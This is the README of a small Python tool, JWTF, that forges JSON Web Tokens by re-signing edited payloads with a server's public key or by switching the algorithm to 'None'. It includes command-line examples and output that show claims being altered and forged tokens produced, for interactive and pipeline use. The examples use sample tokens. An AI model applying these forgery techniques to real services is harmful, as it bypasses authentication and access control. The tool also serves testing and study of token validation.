# JWTF?!  
  
JWTF was built to help me further understand some funky attacks against JSON Web Tokens. So far this tool will take an existing JWT and allow the payload to be modified either dynamically (within an interactive shell - default), or automatically by supplying the choice and forcing it to run in one-liner mode.
  
## Modes:  
  
0: Runs all  
1: Allows patching and resigns target JWT with provided public key   
2: Allows patching and rebuilds JWT with None algorithm  

## Options:
  
```
usage: jwtf.py [-h] [--ol] [--quiet] {0,1,2} ... jwt

positional arguments:
  {0,1,2}
  jwt         The server supplied JWT

optional arguments:
  -h, --help  show this help message and exit
  --ol        Run in one-liner
  --quiet     Surpress debug prints and output noise
```
  
Interactive Usage (Mode = 1):  
```
python3 jwtf.py 1 --key="test.pub" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5"
```
  
Output:  
```
JWT the F**K?!
Just trying to further understand web tokens...
 - Gary @crawl3r

Mode: [1] Resign with public key

[*] Loading public key from: test.pub
lol

[*] Decoding supplied JWT
	Header: {'alg': 'HS256', 'typ': 'JWT'}
	Payload: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022}
[*] JWT is already HS256
	Header: {'alg': 'HS256', 'typ': 'JWT'}
Current payload options:
	[0] -> sub : 1234567890 : <class 'str'>
	[1] -> name : John Doe : <class 'str'>
	[2] -> iat : 1516239022 : <class 'int'>
[-1] -> Finish patching

Select the value above you want to patch: 1  
New value for name (type: <class 'str'>): Terry
Current payload options:
	[0] -> sub : 1234567890 : <class 'str'>
	[1] -> name : Terry : <class 'str'>
	[2] -> iat : 1516239022 : <class 'int'>
[-1] -> Finish patching

Select the value above you want to patch: -1
[*] Finished patching
	Payload: {'sub': '1234567890', 'name': 'Terry', 'iat': 1516239022}
New JWT created and signed:
----------------------------------
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogIlRlcnJ5IiwgImlhdCI6IDE1MTYyMzkwMjJ9.R5y0MxNrDDg6c-6X-6iMLP4wtObZmw3vrogjpOzGCLA
----------------------------------
```
  
Interactive Usage (Mode = 2):  
```
python3 jwtf.py 2 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5"
```
  
Output:  
```
JWT the F**K?!
Just trying to further understand web tokens...
 - Gary @crawl3r

Mode: [2] Rebuild with None

[*] Decoding supplied JWT
	Header: {'alg': 'HS256', 'typ': 'JWT'}
	Payload: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022}
[*] Algorithm patched to None
	Header: {'alg': 'None', 'typ': 'JWT'}
Current payload options:
	[0] -> sub : 1234567890 : <class 'str'>
	[1] -> name : John Doe : <class 'str'>
	[2] -> iat : 1516239022 : <class 'int'>
[-1] -> Finish patching

Select the value above you want to patch: 1
New value for name (type: <class 'str'>): Susan
Current payload options:
	[0] -> sub : 1234567890 : <class 'str'>
	[1] -> name : Susan : <class 'str'>
	[2] -> iat : 1516239022 : <class 'int'>
[-1] -> Finish patching

Select the value above you want to patch: -1
[*] Finished patching
	Payload: {'sub': '1234567890', 'name': 'Susan', 'iat': 1516239022}
New JWT created and signed:
----------------------------------
eyJhbGciOiAiTm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogIlN1c2FuIiwgImlhdCI6IDE1MTYyMzkwMjJ9.
----------------------------------
```
  
One-liner Usage (Mode = 2):  
```
python3 jwtf.py 2 --choices="name:jeff" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5" --ol
```
  
Output:  
```
JWT the F**K?!
Just trying to further understand web tokens...
 - Gary @crawl3r

Mode: [2] Rebuild with None

[*] Decoding supplied JWT
	Header: {'alg': 'HS256', 'typ': 'JWT'}
	Payload: {'sub': '1234567890', 'name': 'John Doe', 'iat': 1516239022}
[*] Algorithm patched to None
	Header: {'alg': 'None', 'typ': 'JWT'}
	Payload: {'sub': '1234567890', 'name': 'jeff', 'iat': 1516239022}
New JWT created and signed:
----------------------------------
eyJhbGciOiAiTm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogImplZmYiLCAiaWF0IjogMTUxNjIzOTAyMn0.
----------------------------------
```
  
## Quiet mode for pipeline usage  
  
Usage:
```
gary@MacBook-Air JwtTheFuck % python3 jwtf.py 2 --choices="name:jeff" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5" --ol --quiet
```
  
Output:
```
eyJhbGciOiAiTm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogImplZmYiLCAiaWF0IjogMTUxNjIzOTAyMn0.
```